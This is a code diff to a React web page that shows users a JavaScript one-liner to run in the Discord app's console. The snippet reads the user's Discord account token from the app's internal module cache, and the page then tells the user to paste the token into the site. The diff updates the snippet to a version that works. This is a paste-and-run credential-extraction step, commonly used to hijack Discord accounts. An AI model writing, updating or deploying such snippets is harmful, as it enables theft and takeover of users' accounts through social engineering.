@@ -602,7 +602,7 @@ export default function Home() {
                   color: '#57f287', wordBreak: 'break-all', userSelect: 'all',
                   border: '1px solid rgba(87,242,135,0.2)',
                 }}>
-                  {`(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken).exports.default.getToken()`}
+                  {`Object.values(webpackChunkdiscord_app.push([[Symbol()],{},e=>e]).c).find(e=>e?.exports?.getToken)?.exports?.getToken()`}
                 </div>
                 <p style={{ color: '#aaa', fontSize: '0.82rem', margin: 0 }}>
                   Copy the token string it outputs, then paste it below.
